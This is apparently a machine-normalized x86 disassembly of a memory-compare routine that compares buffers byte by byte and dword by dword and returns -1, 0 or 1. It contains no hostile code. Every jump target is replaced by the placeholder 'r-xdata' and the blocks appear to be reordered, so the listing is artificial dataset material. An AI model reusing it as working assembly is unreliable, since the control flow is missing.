movzx ecx [ esi + 0x1 ]
jmp r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
dec eax
je r-xdata
movzx eax [ ecx + 0x1 ]
movzx edx [ esi + 0x1 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push ebx
push 0x20
pop edx
jmp r-xdata
movzx eax [ ecx + 0x2 ]
movzx ecx [ esi + 0x2 ]
jmp r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
movzx eax [ ecx + 0x1 ]
movzx edx [ esi + 0x1 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
cmp edi edx
jae r-xdata
movzx eax [ ecx + 0x2 ]
movzx edx [ esi + 0x2 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
mov esi [ eax ]
cmp esi [ ecx ]
je r-xdata
add eax edi
add ecx edi
cmp edi 0x1f
ja r-xdata
movzx eax [ ecx + 0x3 ]
movzx ecx [ esi + 0x3 ]
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
xor esi esi
movzx esi [ eax ]
movzx ebx [ ecx ]
sub esi ebx
je r-xdata
xor eax eax
jmp [ edi * 4 + jump_table_2020178 ]
mov eax esi
jmp r-xdata
mov esi [ eax + 0x4 ]
cmp esi [ ecx + 0x4 ]
je r-xdata
movzx esi [ eax + 0x1 ]
movzx ebx [ ecx + 0x1 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
mov edx [ eax - 0x1c ]
cmp edx [ ecx - 0x1c ]
je r-xdata
mov edx [ eax - 0x18 ]
cmp edx [ ecx - 0x18 ]
je r-xdata
mov edx [ eax - 0x14 ]
cmp edx [ ecx - 0x14 ]
je r-xdata
mov edx [ eax - 0x10 ]
cmp edx [ ecx - 0x10 ]
je r-xdata
mov edx [ eax - 0xc ]
cmp edx [ ecx - 0xc ]
je r-xdata
mov edx [ eax - 0x8 ]
cmp edx [ ecx - 0x8 ]
je r-xdata
mov edx [ eax - 0x4 ]
cmp edx [ ecx - 0x4 ]
je r-xdata
mov edx [ eax - 0x1d ]
cmp edx [ ecx - 0x1d ]
je r-xdata
mov edx [ eax - 0x19 ]
cmp edx [ ecx - 0x19 ]
je r-xdata
mov edx [ eax - 0x15 ]
cmp edx [ ecx - 0x15 ]
je r-xdata
mov edx [ eax - 0x11 ]
cmp edx [ ecx - 0x11 ]
je r-xdata
mov edx [ eax - 0xd ]
cmp edx [ ecx - 0xd ]
je r-xdata
mov edx [ eax - 0x9 ]
cmp edx [ ecx - 0x9 ]
je r-xdata
mov edx [ eax - 0x5 ]
cmp edx [ ecx - 0x5 ]
je r-xdata
movzx ecx [ ecx - 0x1 ]
movzx eax [ eax - 0x1 ]
sub eax ecx
je r-xdata
mov edx [ eax - 0x1e ]
cmp edx [ ecx - 0x1e ]
je r-xdata
mov edx [ eax - 0x1a ]
cmp edx [ ecx - 0x1a ]
je r-xdata
mov edx [ eax - 0x16 ]
cmp edx [ ecx - 0x16 ]
je r-xdata
mov edx [ eax - 0x12 ]
cmp edx [ ecx - 0x12 ]
je r-xdata
mov edx [ eax - 0xe ]
cmp edx [ ecx - 0xe ]
je r-xdata
mov edx [ eax - 0xa ]
cmp edx [ ecx - 0xa ]
je r-xdata
mov edx [ eax - 0x6 ]
cmp edx [ ecx - 0x6 ]
je r-xdata
mov dx [ eax - 0x2 ]
cmp dx [ ecx - 0x2 ]
je r-xdata
mov edx [ eax - 0x1f ]
cmp edx [ ecx - 0x1f ]
je r-xdata
mov edx [ eax - 0x1b ]
cmp edx [ ecx - 0x1b ]
je r-xdata
mov edx [ eax - 0x17 ]
cmp edx [ ecx - 0x17 ]
je r-xdata
mov edx [ eax - 0x13 ]
cmp edx [ ecx - 0x13 ]
je r-xdata
mov edx [ eax - 0xf ]
cmp edx [ ecx - 0xf ]
je r-xdata
mov edx [ eax - 0xb ]
cmp edx [ ecx - 0xb ]
je r-xdata
mov edx [ eax - 0x7 ]
cmp edx [ ecx - 0x7 ]
je r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
pop ebx
jmp r-xdata
xor esi esi
movzx esi [ eax + 0x4 ]
movzx ebx [ ecx + 0x4 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x2 ]
movzx ebx [ ecx + 0x2 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xc ]
movzx esi [ eax - 0xc ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor eax eax
movzx esi dl
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0x9 ]
movzx esi [ eax - 0x9 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor ecx ecx
test eax eax
setg cl
lea ecx [ ecx + ecx - 0x1 ]
mov eax ecx
jmp r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1e ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xa ]
movzx esi [ eax - 0xa ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
movzx edx [ ecx - 0x2 ]
movzx esi [ eax - 0x2 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0x1f ]
movzx esi [ eax - 0x1f ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xf ]
movzx esi [ eax - 0xf ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
je r-xdata
mov esi [ eax + 0x8 ]
cmp esi [ ecx + 0x8 ]
je r-xdata
movzx esi [ eax + 0x5 ]
movzx ebx [ ecx + 0x5 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x3 ]
movzx ebx [ ecx + 0x3 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x7 ]
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x8 ]
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1d ]
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx edx [ ecx - 0x9 ]
movzx esi [ eax - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
movzx esi [ eax - 0x1e ]
movzx edx [ ecx - 0x1e ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
mov eax edx
jmp r-xdata
xor esi esi
movzx esi [ eax + 0x8 ]
movzx ebx [ ecx + 0x8 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x6 ]
movzx ebx [ ecx + 0x6 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x2 ]
movzx edx [ ecx - 0x2 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
mov eax edx
jmp r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x7 ]
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx edx [ ecx - 0x8 ]
movzx esi [ eax - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
jmp r-xdata
movzx esi [ eax - 0x1d ]
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x9 ]
movzx edx [ ecx - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
mov esi [ eax + 0xc ]
cmp esi [ ecx + 0xc ]
je r-xdata
movzx esi [ eax + 0x9 ]
movzx ebx [ ecx + 0x9 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x7 ]
movzx ebx [ ecx + 0x7 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x9 ]
movzx edx [ ecx - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
sub eax ecx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
je r-xdata
test eax eax
jne r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x2 ]
movzx edx [ ecx - 0x2 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx edx [ ecx - 0x7 ]
movzx esi [ eax - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x8 ]
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0xc ]
movzx ebx [ ecx + 0xc ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0xa ]
movzx ebx [ ecx + 0xa ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
